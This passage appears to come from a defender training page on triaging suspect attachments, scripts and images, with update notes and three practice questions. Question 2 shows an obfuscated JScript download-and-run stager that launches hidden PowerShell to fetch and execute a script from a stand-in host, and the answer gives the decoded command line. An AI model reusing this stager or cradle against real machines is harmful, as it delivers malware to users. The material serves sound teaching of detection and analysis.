!!! success "[2026 Current] Still valid"
    Everything on this page still holds. Lures are still built for humans, so a safe screenshot still settles many document cases quickly. "Assume it will infect whatever opens it" is still the right default, and the privacy problem with public sandboxes is unchanged. Malicious scripts are still mostly small stagers, still heavily obfuscated, and still easiest to understand by static decoding plus PowerShell 4104 logs. Pictures are still used as dead drops and payload carriers, through both metadata and steganography. The five-question routine is a sound fast path, and the host-part lessons (attack stages, defence in depth, knowing your logs and your pipeline) are as relevant as ever.

!!! info "[Changed] What has changed"
    - **Sandbox landscape.** The original Cuckoo Sandbox is unmaintained and the free malwr.com service is long gone. Self-hosted options today are mainly CAPE and Cuckoo3. Online services include Hybrid Analysis, ANY.RUN, Joe Sandbox and Triage, and most EDR and email gateways have one built in. Check what your organisation's tier makes public.
    - **The lure moved from the file to the clipboard.** With macros from the internet blocked by default since 2022, many campaigns stopped attaching scripts. Instead, a web page ("fake CAPTCHA", "fix this error", "verify you are human") tells the user to paste a command into the Run dialog or a terminal. ATT&CK added **T1204.004 User Execution: Malicious Copy and Paste** for this "ClickFix" pattern. There's no file to triage, so detection relies on process creation (`explorer.exe` → `powershell.exe` or `mshta.exe` with a download) and the RunMRU registry key.
    - **VBScript is being retired.** Windows 11 24H2 made VBScript an optional feature (still installed by default). Microsoft plans to disable it by default in a later phase (announced for around 2027) and then remove it. `.vbs` attachments will become less useful to attackers, while JavaScript, PowerShell and `.hta` remain.
    - **Steganography is common in loaders.** Several 2025 campaigns hid their next stage in PNG pixel data or in data appended to images, often delivered through fake update or CAPTCHA pages. For defenders, catching the loader's behaviour on the host remains more reliable than finding the hidden bits.
    - **AI on both sides.** Attackers use generative AI to write convincing lures and to produce endlessly varied obfuscated scripts, which makes hash- and string-based script detection weaker. Defenders use AI assistants in sandboxes and EDR consoles to explain and deobfuscate scripts. Treat the AI's explanation as a lead and confirm it against the decoded code and the logs.
    - **ATT&CK names used on this page**: T1105 Ingress Tool Transfer, T1059.001/.005/.007 PowerShell/Visual Basic/JavaScript, T1027.010 Command Obfuscation, T1027.003 Steganography, T1140 Deobfuscate/Decode Files or Information, T1204.002 Malicious File, T1204.004 Malicious Copy and Paste, T1102.001 Dead Drop Resolver, T1001.002 Data Obfuscation: Steganography.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't upload sensitive or targeted samples to public sandboxes by reflex.** Hash lookup first, private sandbox second. Free tiers often make the file, its screenshots and the URLs inside it public.
    - **Don't open suspect documents on your workstation "just to look"**, not even in a preview pane. Use a sandbox or a revertible VM.
    - **Don't read "no child processes" in a sandbox as harmless.** The lure may need a click, a real user, a specific country or a delay. Combine behaviour with static checks.
    - **Don't deobfuscate by running the script with the last line changed.** Decode statically, layer by layer, and never on a production machine.
    - **Don't rely on keyword matching for scripts.** Obfuscation exists to break it. Use 4104 (which sees the decoded code), AMSI and behaviour (who launched the interpreter, where it connected).
    - **Don't dismiss a picture because it "is only an image".** Check its metadata and trailing data, and above all look for the process that downloaded it.
    - **Don't treat obfuscation alone as proof.** Minified and protected legitimate code exists. Decide on what the decoded code does and where it came from.

## Practice questions { #quiz }

### Question 1

A user forwards an attachment called `Contract_Renewal_2027.docx` that "looks weird". Your colleague suggests uploading it to a free public sandbox to get a screenshot. (a) What are the risks of doing that first? (b) What order of steps would you use instead? (c) The sandbox you end up using shows a blurred page with "Click ENABLE CONTENT to view" and **no child processes**. What's your verdict, and why doesn't the empty process tree change it?

??? success "Answer and explanation"
    **(a)** Free public submissions are usually visible to anyone. If the file is genuine, a real contract's contents (and its screenshot) are now public. If it's a targeted attack, the attacker watching for their samples learns you found it. And if the document contains a personalised link, the sandbox following it tells the attacker which recipient investigated.

    **(b)** Compute the SHA-256 and look the **hash** up first (no content leaves the building). Then use a **private** sandbox (on-premises or a paid tier that keeps submissions private) or your own snapshot VM, which you revert afterwards. Run static checks (`oleid`/`olevba` for macros, `unzip -l` and the relationships file for links and remote templates) alongside. A public submission comes last and only for clearly commodity samples, if policy allows.

    **(c)** **Malicious lure.** A legitimate contract never needs you to enable content to read it. The empty process tree only means the trigger (clicking Enable Content) never happened in the sandbox, or the sample detected the sandbox. Confirm the macro statically, collect IOCs (hash, URLs, sender), and check whether any recipient's `WINWORD.EXE` spawned a child process.

### Question 2

This line is the whole of a 300-byte attachment called `scan_0412.js`:

```text
var a=['\x68\x74\x74\x70\x73\x3a\x2f\x2f','upd-cdn','.example/','g.ps1'];var s=new ActiveXObject('WScript.Shell');s['R'+'un']('powershell -w hidden -c "IEX(iwr '+a[0]+a[1]+a[2]+a[3]+')"',0);
```

(a) Name the two tells of a malicious script it shows. (b) What is `\x68\x74\x74\x70\x73\x3a\x2f\x2f`, and why is it written that way? (c) What would you expect to see in 4688 and 4104 if a user double-clicked it, and which ATT&CK techniques apply?

??? success "Answer and explanation"
    **(a)** **Tiny download-and-run stager**: 300 bytes whose only job is to start PowerShell to download `g.ps1` and run it with `IEX`. **Obfuscation**: the URL is split into an array and partly hex-escaped, and the method name `Run` is split (`'R'+'un'`) so keyword scanners miss it. The `0` at the end means "hidden window".

    **(b)** JavaScript hex escapes for `https://` (`\x68` = `h`, `\x74` = `t`, `\x3a` = `:`, `\x2f` = `/`). Written this way, the file never contains the literal text `https://`, which defeats simple URL extraction and keyword filters. Joined, the URL is `https://upd-cdn.example/g.ps1`.

    **(c)** **4688**: `wscript.exe` (parent `explorer.exe`, file `scan_0412.js`, probably in Downloads or `%TEMP%\Temp1_*.zip`), then `powershell.exe` with parent `wscript.exe` and a command line containing `-w hidden -c "IEX(iwr https://upd-cdn.example/g.ps1)"`. **4104**: the `IEX(iwr ...)` command as a script block, then the contents of `g.ps1` as further blocks, decoded, even though `g.ps1` never touches the disk. Techniques: **T1204.002** (user ran a malicious file), **T1059.007** JavaScript, **T1059.001** PowerShell, **T1027.010** command obfuscation, **T1105** ingress tool transfer.

### Question 3

During an investigation, Sysmon shows `C:\Users\p.ng\AppData\Roaming\Lumen\lumen.exe` (unsigned) querying `img.socialsite.example` and downloading a small JPEG once an hour. `strings -n 8` on the downloaded picture prints only `KeyJ0YXNrIjoic2xlZXAifQ==`. (a) Is the picture malware? Explain what role it plays. (b) Why would `base64 -d` on that exact string fail, and what's the fix? What does it decode to? (c) Where is this activity easiest to detect: in the network traffic or on the host? Why?

??? success "Answer and explanation"
    **(a)** Not by itself. Opened in a viewer, it's just a picture. It's a **message for malware that's already running**: `lumen.exe` downloads it periodically and reads instructions or configuration from it, here from the metadata (a dead drop, **T1102.001**, with the data hidden in the image, **T1001.002**). The malware is `lumen.exe`. The picture is evidence and an IOC source.

    **(b)** The first character `K` is almost certainly not part of the message: it's a stray printable byte from the segment header (like the length byte `V` in this page's example) that `strings` glued onto the front. With it, every character is shifted by one position in its 4-character Base64 group and the output is garbage. Start at `eyJ` (Base64 for `{"`): `grep -o 'eyJ[A-Za-z0-9+/=]*' | base64 -d` gives `{"task":"sleep"}`, a command telling the malware to stay quiet.

    **(c)** **On the host.** To the network, it's an ordinary HTTPS request for a picture from a popular site, which looks like browsing. On the host, Sysmon 22/3 show **which process** made the request: an unsigned binary in `AppData\Roaming` fetching images every hour on the dot is not normal, while a browser doing the same would be. The regular interval (a beacon) and the process identity are the detection, and they lead you to `lumen.exe` and its persistence.

## Related { #related }

- [Hashing and code signatures](hashing-signatures.md) · [RTF, PDF and other files as exploits](rtf-pdf-misc-triage.md) · [Handling suspect files safely](safe-handling-file-types.md)
- [Strings](strings.md) · [Identifying files](file-identification.md) · [File analysis overview](index.md)
- [Screenshots, sandboxes and when to go manual](../http-analysis/screenshots-sandboxes.md) · [Base64](../http-analysis/base64.md) · [URL reputation](../http-analysis/evil-http-and-reputation.md)
- [Account, Defender and PowerShell events (4104)](../important-events/accounts-defender-powershell.md) · [Process creation events](../important-events/process-creation.md)
- [PowerShell download cradles](../../../adversary/powershell-cradles.md) · [Phishing delivery & initial execution](../../../adversary/phishing-delivery.md)
